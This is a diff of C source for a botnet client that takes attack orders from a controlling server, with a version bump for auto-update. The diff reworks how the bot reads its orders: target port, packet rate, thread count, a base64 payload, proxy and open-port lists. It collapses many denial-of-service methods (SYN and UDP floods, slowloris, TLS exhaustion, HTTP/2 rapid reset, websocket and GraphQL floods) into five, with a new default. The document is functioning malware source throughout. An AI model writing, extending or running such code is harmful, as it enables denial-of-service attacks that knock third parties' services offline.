@@ -10,7 +10,7 @@ char g_bot_uuid[64] = {0};
 char g_cur_task_id[64] = {0};
 
 /* Must match GitHub release tag style for auto-update compare */
-#define BOT_VERSION_TAG "v4.0.60"
+#define BOT_VERSION_TAG "v4.0.69"
 
 static void sig_handler(int sig) { (void)sig; g_shutdown = 1; }
 
@@ -621,32 +621,38 @@ int main(int argc, char *argv[])
                 atk.slowloris = (unsigned)json_int(buf, "slowloris");
                 atk.tls_exhaust = (unsigned)json_int(buf, "tls_exhaust");
                 atk.mega_mode = (unsigned)json_int(buf, "mega_mode");
-                /* Server-provided payload (base64) + proxy list */
+                /* Server-provided payload (base64) + proxy list + open ports */
                 json_str(buf, "payload", atk.payload_b64, sizeof(atk.payload_b64));
                 json_str(buf, "proxies", atk.proxies, sizeof(atk.proxies));
+                json_str(buf, "open_ports", atk.open_ports, sizeof(atk.open_ports));
                 if (!atk.max_pps) atk.max_pps = cfg.default_pps;
                 if (!atk.max_threads) atk.max_threads = cfg.default_threads;
-                if (!atk.method[0]) strcpy(atk.method, "UDP");
-                /* Normalize aliases; reject unknown methods (no silent MEGA) */
+                if (!atk.method[0]) strcpy(atk.method, "PSPE");
                 {
                     char *m = atk.method;
                     for (char *p = m; *p; p++)
                         if (*p >= 'a' && *p <= 'z') *p -= 32;
-                    if (!strcmp(m, "TCP") || !strcmp(m, "ACK")) strcpy(m, "MEGA");
-                    else if (!strcmp(m, "HTTPS")) strcpy(m, "HTTP");
-                    else if (!strcmp(m, "SLOW")) strcpy(m, "SLOWLORIS");
-                    else if (!strcmp(m, "TLS") || !strcmp(m, "SSL")) strcpy(m, "TLS_EXHAUST");
-                    else if (!strcmp(m, "PROXY")) strcpy(m, "HTTP_PROXY");
-                    if (strcmp(m, "UDP") && strcmp(m, "MEGA") &&
-                        strcmp(m, "HTTP") && strcmp(m, "SLOWLORIS") &&
-                        strcmp(m, "TLS_EXHAUST") && strcmp(m, "HTTP_PROXY") &&
-                        strcmp(m, "GAME") && strcmp(m, "H2RAPID") &&
-                        strcmp(m, "WSFLOOD") && strcmp(m, "GRAPHQL")) {
+                    /* 5 methods only: PSPE | TCP | TLS | HTTP | GAME */
+                    if (!strcmp(m, "ACK") || !strcmp(m, "SYN") || !strcmp(m, "SYNFLOOD"))
+                        strcpy(m, "TCP");
+                    else if (!strcmp(m, "UDP") || !strcmp(m, "MEGA") || !strcmp(m, "PORT") || !strcmp(m, "SCAN"))
+                        strcpy(m, "PSPE");
+                    else if (!strcmp(m, "HTTPS") || !strcmp(m, "WEB") || !strcmp(m, "HTTP_PROXY")
+                          || !strcmp(m, "PROXY") || !strcmp(m, "H2RAPID") || !strcmp(m, "WSFLOOD")
+                          || !strcmp(m, "GRAPHQL") || !strcmp(m, "SLOW") || !strcmp(m, "SLOWLORIS"))
+                        strcpy(m, "HTTP");
+                    else if (!strcmp(m, "TLS_EXHAUST") || !strcmp(m, "SSL"))
+                        strcpy(m, "TLS");
+                    else if (!strcmp(m, "NRO"))
+                        strcpy(m, "GAME");
+                    if (strcmp(m, "PSPE") && strcmp(m, "TCP") && strcmp(m, "TLS") &&
+                        strcmp(m, "HTTP") && strcmp(m, "GAME")) {
                         if (foreground)
                             fprintf(stderr, "[bot] ignore unknown method '%s'\n", m);
                         continue;
                     }
-                    if (!strcmp(m, "MEGA")) atk.mega_mode = 1;
+                    if (!strcmp(m, "PSPE")) atk.mega_mode = 1;
+                    if (!strcmp(m, "TLS")) atk.tls_exhaust = 1;
                 }
                 if (atk.duration_secs <= 0) atk.duration_secs = 60;
                 if (atk.port <= 0) atk.port = 80;
